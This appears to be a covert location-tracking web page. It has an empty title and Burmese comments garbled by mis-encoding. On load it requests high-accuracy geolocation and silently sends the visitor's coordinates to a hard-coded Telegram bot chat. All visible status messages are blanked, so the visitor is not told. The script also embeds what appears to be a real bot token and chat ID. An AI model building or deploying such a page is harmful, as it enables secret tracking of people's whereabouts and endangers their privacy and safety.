<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>

    <p id="result"></p>

    <script>
        // **********************************************
        // ğŸš¨ á€¤á€”á€±á€›á€¬á€á€½á€„á€º á€á€„á€ºá á€¡á€á€»á€€á€ºá€¡á€œá€€á€ºá€™á€»á€¬á€¸á€€á€­á€¯ á€•á€¼á€±á€¬á€„á€ºá€¸á€œá€²á€•á€«á‹
        // **********************************************
        const BOT_TOKEN = "7450505378:AAHCCCmNZUvaz-ybfFd2HWKgupc2eJ01y7c"; // á€á€„á€·á€º Bot Token
        const CHAT_ID = "1178561927";     // Location á€•á€­á€¯á€·á€œá€­á€¯á€á€±á€¬ Chat ID
        // **********************************************

        // 1. Page Load á€á€½á€„á€º Location á€€á€­á€¯ á€…á€á€„á€ºá€á€±á€¬á€„á€ºá€¸á€á€¶á€á€Šá€º
        function getLocationAndSend() {
            var resultElement = document.getElementById("result");

            if (navigator.geolocation) {
                // Location á€á€½á€„á€·á€ºá€•á€¼á€¯á€á€»á€€á€º Popup á€€á€­á€¯ á€á€»á€€á€ºá€á€»á€„á€ºá€¸á€á€±á€¬á€„á€ºá€¸á€á€¶á€á€¼á€„á€ºá€¸
                navigator.geolocation.getCurrentPosition(showPosition, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000, // 10 á€…á€€á€¹á€€á€”á€·á€º á€…á€±á€¬á€„á€·á€ºá€™á€Šá€º
                    maximumAge: 0
                });
            } else {
                resultElement.innerHTML = "Browser á€á€½á€„á€º Geolocation á€€á€­á€¯ Support á€™á€œá€¯á€•á€ºá€•á€«á‹";
            }
        }

        // 2. Location á€›á€›á€¾á€­á€á€½á€¬á€¸á€•á€«á€€ á€¤ Function á€€á€­á€¯ á€á€±á€«á€ºá€á€Šá€º
        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            var resultElement = document.getElementById("result");

            resultElement.innerHTML = "" + 
                                     "" +
                                     
                                     "";

            // Location á€€á€­á€¯ Telegram Bot á€á€­á€¯á€· á€•á€­á€¯á€·á€›á€”á€º Function á€€á€­á€¯ á€á€±á€«á€ºá€á€Šá€º
            sendLocationToTelegram(latitude, longitude);
        }

        // 3. Error á€á€…á€ºá€á€¯á€á€¯ á€–á€¼á€…á€ºá€•á€±á€«á€ºá€•á€«á€€ á€¤ Function á€€á€­á€¯ á€á€±á€«á€ºá€á€Šá€º
        function showError(error) {
            var resultElement = document.getElementById("result");
            let errorMessage = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = "";
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = "";
                    break;
                case error.TIMEOUT:
                    errorMessage = "";
                    break;
                case error.UNKNOWN_ERROR:
                    errorMessage = "âŒ á€¡á€™á€Šá€ºá€™á€á€­ Error á€á€…á€ºá€á€¯á€á€¯ á€–á€¼á€…á€ºá€•á€½á€¬á€¸á€á€²á€·á€•á€«á€á€Šá€ºá‹";
                    break;
            }
            resultElement.innerHTML = errorMessage;
        }

        // 4. Telegram Bot API á€€á€­á€¯ á€¡á€á€¯á€¶á€¸á€•á€¼á€¯á€•á€¼á€®á€¸ Location á€•á€­á€¯á€·á€á€Šá€ºá€· Function
        function sendLocationToTelegram(lat, lon) {
            const resultElement = document.getElementById("result");
            
            // Telegram Bot API á€›á€²á€· sendLocation Method á€€á€­á€¯ á€á€±á€«á€ºá€›á€”á€º URL
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        resultElement.innerHTML += "";
                        console.log("Location sent to Telegram:", data);
                    } else {
                        resultElement.innerHTML += "";
                        console.error("Telegram API Error:", data);
                    }
                })
                .catch(error => {
                    resultElement.innerHTML += `<br>âŒ Network Error: ${error.message}`;
                    console.error("Fetch Error:", error);
                });
        }

        // Page á€…á€á€„á€º Load á€œá€¯á€•á€ºá€á€¬á€”á€²á€· Function á€€á€­á€¯ á€á€»á€€á€ºá€á€»á€„á€ºá€¸á€á€±á€«á€ºá€á€¼á€„á€ºá€¸
        window.onload = getLocationAndSend;

    </script>
</body>
</html>
